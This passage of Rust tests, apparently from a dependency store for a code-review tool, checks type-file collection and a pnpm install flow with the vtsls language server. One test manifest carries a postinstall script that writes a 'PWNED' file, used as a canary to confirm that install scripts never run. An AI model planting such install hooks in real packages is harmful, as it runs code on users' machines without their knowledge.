        std::fs::create_dir_all(nm.join("react")).unwrap();
        std::fs::write(nm.join("react/package.json"), r#"{"name":"react"}"#).unwrap();
        std::fs::write(nm.join("react/index.js"), "x").unwrap();
        std::fs::create_dir_all(nm.join("@types/react")).unwrap();
        std::fs::write(
            nm.join("@types/react/package.json"),
            r#"{"dependencies":{"csstype":"3"}}"#,
        )
        .unwrap();
        std::fs::write(nm.join("@types/react/index.d.ts"), "import 'csstype'").unwrap();
        std::fs::create_dir_all(nm.join("csstype")).unwrap();
        std::fs::write(nm.join("csstype/package.json"), "{}").unwrap();
        std::fs::write(nm.join("csstype/index.d.ts"), "export {}").unwrap();
        let got: Vec<String> = collect_types(&wt, 1 << 20)
            .into_iter()
            .map(|(p, _)| p)
            .collect();
        assert!(
            got.contains(&"node_modules/@types/react/index.d.ts".to_string()),
            "{got:?}"
        );
        assert!(
            got.contains(&"node_modules/csstype/index.d.ts".to_string()),
            "{got:?}"
        );
        assert!(
            !got.iter().any(|p| p.starts_with("node_modules/react/")),
            "no .d.ts, so skipped: {got:?}"
        );
        let _ = std::fs::remove_dir_all(&wt);
    }

    /// Real install + real vtsls. Needs network, pnpm and node:
    /// `cargo test -p tab-core --lib deps::tests::end_to_end -- --ignored`
    #[tokio::test]
    #[ignore]
    async fn end_to_end() {
        let base = tmp("e2e");
        let store = DepStore::new(base.join(".shared"));
        let manifest = r#"{"name":"e2e","dependencies":{"@types/react":"19.1.8"},"scripts":{"postinstall":"node -e \"require('fs').writeFileSync('PWNED','')\""}}"#;
        let mut keys = Vec::new();
        for n in ["pr-1", "pr-2"] {
            let wt = base.join(n);
            std::fs::create_dir_all(wt.join("src")).unwrap();
            std::fs::write(wt.join("package.json"), manifest).unwrap();
            let st = std::process::Command::new(crate::lsp::find("pnpm").unwrap())
                .args(["install", "--lockfile-only", "--ignore-scripts"])
                .current_dir(&wt)
                .output()
                .unwrap();
            assert!(
                st.status.success(),
                "{}",
                String::from_utf8_lossy(&st.stderr)
            );
            std::fs::write(wt.join("tsconfig.json"), r#"{"compilerOptions":{"jsx":"react-jsx","strict":true,"module":"esnext","moduleResolution":"bundler"}}"#).unwrap();
            let status = store.prepare_js(&wt).await.unwrap();
            assert_eq!(status.state, "ready", "{status:?}");
            assert_eq!(status.reused, n == "pr-2", "{status:?}");
            keys.push(status.key.unwrap());
            assert!(wt.join("node_modules/@types/react/index.d.ts").is_file());
        }
        assert_eq!(keys[0], keys[1]);
        assert!(
            !base
                .join(".shared/js")
                .join(&keys[0])
                .join("PWNED")
                .exists(),
            "scripts never run"
        );
        let types = store.types(&base.join("pr-1"), 1 << 24);
        assert!(
            types
                .iter()
                .any(|(p, _)| p == "node_modules/@types/react/index.d.ts")
        );
        assert!(
            types
                .iter()
                .any(|(p, _)| p.starts_with("node_modules/csstype/")),
            "follows type deps"
        );

        // vtsls resolves React's types through the link.
        let tools = std::env::var("TAB_TEST_TOOLS").map(PathBuf::from);
        if let Ok(tools) = tools {
            crate::lsp::set_tools_dir(tools);
            let wt = base.join("pr-1");
            let src = "import { useState } from 'react';
export const n = useState(1);
";
            std::fs::write(wt.join("src/a.ts"), src).unwrap();
            let hub = crate::lsp::LspHub::new();
            let s = hub.start("vtsls", &wt, |_| {}).await.unwrap();
            let uri = format!("{}/src/a.ts", s.root_uri);
            s.notify("textDocument/didOpen", serde_json::json!({ "textDocument": { "uri": uri, "languageId": "typescript", "version": 1, "text": src } })).await.unwrap();
            let mut text = String::new();
            for _ in 0..20 {
                let h = s.request("textDocument/hover", serde_json::json!({ "textDocument": { "uri": uri }, "position": { "line": 1, "character": 14 } })).await.unwrap_or_default();
                text = h.to_string();
                if text.contains("Dispatch") {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(500)).await;
            }
            assert!(text.contains("Dispatch"), "hover: {text}");
            eprintln!("vtsls hover: {}", &text[..text.len().min(160)]);
            let toks = s
                .request(
                    "textDocument/semanticTokens/full",
                    serde_json::json!({ "textDocument": { "uri": uri } }),
                )
                .await
                .unwrap();
            assert!(
                toks["data"].as_array().is_some_and(|d| !d.is_empty()),
                "{toks}"
            );
            hub.stop_all().await;
        }
        crate::deps::unlink(&base.join("pr-1"));
        crate::deps::unlink(&base.join("pr-2"));
        let swept = store.sweep(&[], Duration::ZERO).await;
        assert_eq!(swept.removed, 1);
        let _ = std::fs::remove_dir_all(&base);
    }
}
